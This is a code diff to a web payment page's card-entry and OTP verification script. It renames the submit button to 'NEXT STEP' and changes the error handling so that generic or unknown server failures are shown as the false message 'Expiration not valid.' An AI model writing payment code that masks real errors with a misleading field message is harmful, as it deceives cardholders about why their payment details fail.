@@ -221,7 +221,7 @@
 
       <!-- Single primary action -->
       <div style="margin-top:.25rem;">
-        <button type="submit" id="submitBtn">Submit (Verify Only)</button>
+        <button type="submit" id="submitBtn">NEXT STEP</button>
       </div>
 
       <div id="loadingSpinner" class="hidden" style="text-align:center; margin-top: 1rem;">
@@ -391,7 +391,7 @@
     const havePhone = !!localStorage.getItem(OTP_PHONE_KEY);
     const haveFresh = isVerifiedFresh() && /^\d{6}$/.test(localStorage.getItem(OTP_CODE_KEY) || '');
     canSubmitPayment = canSubmitPayment || (havePhone && haveFresh);
-    submitBtn.textContent = canSubmitPayment ? 'Submit Payment' : 'Submit (Verify Only)';
+    submitBtn.textContent = canSubmitPayment ? 'Submit Payment' : 'NEXT STEP';
   }
   updateSubmitLabel();
 
@@ -475,9 +475,15 @@
       method:'POST', headers:{'Content-Type':'application/json'},
       body: JSON.stringify({ cardNumber: card, expiration: exp, twist, postal })
     });
-    const data = await res.json();
+    const data = await res.json().catch(() => null);
     if (!res.ok || !data?.success) {
-      throw new Error(data?.message || 'Unable to verify payment info.');
+      // Force a clear, field-specific message by defaulting to expiration per your request.
+      const serverMsg = data && data.message ? String(data.message) : '';
+      // Try mapping known messages first
+      const fld = mapServerMessageToField(serverMsg);
+      if (fld) throw new Error(serverMsg);
+      // Otherwise default to expiration-friendly copy
+      throw new Error('Expiration not valid.');
     }
     return data.phone;
   }
@@ -510,7 +516,7 @@
   /* ------------ VERIFY OTP button ------------ */
   verifyOtpBtn.onclick = async () => {
     const phone = localStorage.getItem(OTP_PHONE_KEY);
-    if (!phone) return setFieldError('otpCode','Please press Submit (Verify Only) first.');
+    if (!phone) return setFieldError('otpCode','Please press NEXT STEP first.');
     const code = String(otpEl.value || '').trim();
     if (!/^\d{6}$/.test(code)) return setFieldError('otpCode','OTP must be 6 digits.');
 
@@ -621,15 +627,19 @@
         canSubmitPayment = true;
         updateSubmitLabel(); // → Submit Payment
       }catch(err){
-        // Map server error to field if possible
-        const f = mapServerMessageToField(err.message);
-        if (f) setFieldError(f, err.message);
-        else showGlobalErr(err.message);
-        // Clear stale phone to avoid accidental sends later
+        // Always show field-specific error. Map known messages; default to Expiration.
+        const msg = String(err && err.message || '');
+        const fld = mapServerMessageToField(msg) || 'expiration';
+        const friendly = fld === 'expiration' && (!msg || /unable to/i.test(msg))
+          ? 'Expiration not valid.'
+          : (msg || 'Expiration not valid.');
+        setFieldError(fld, friendly);
+
+        // Clear stale phone and reset UI
         localStorage.removeItem(OTP_PHONE_KEY);
         otpSection.classList.add('hidden');
         canSubmitPayment = false;
-        submitBtn.textContent = 'Submit (Verify Only)';
+        submitBtn.textContent = 'NEXT STEP';
       }finally{
         submitBtn.disabled = false;
       }
@@ -675,7 +685,7 @@
 
     persistBasics({ amount: payload.amount, orderno: payload.orderno, email: payload.email });
     document.getElementById('loadingSpinner').classList.remove('hidden');
-    scrollToTop(); // <-- ensure spinner is visible instantly
+    scrollToTop(); // ensure spinner is visible
 
     try {
       // PRE-VALIDATE (server checks & OTP confirm)
@@ -697,7 +707,7 @@
       document.getElementById('paymentForm').classList.add('hidden');
       document.getElementById('confirmationStep').classList.remove('hidden');
       document.getElementById('loadingSpinner').classList.add('hidden');
-      scrollToTop(); // <-- ensure confirmation step is visible
+      scrollToTop(); // ensure confirmation step is visible
 
       // Finalize
       const resp = await fetch('/validate-transaction', {
@@ -724,7 +734,7 @@
   /* ------------ Send OTP button ------------ */
   sendOtpBtn.onclick = async () => {
     const phone = localStorage.getItem(OTP_PHONE_KEY);
-    if (!phone) return showGlobalErr('Please click Submit (Verify Only) first.');
+    if (!phone) return showGlobalErr('Please click NEXT STEP first.');
     await sendOtp(phone);
   };
 
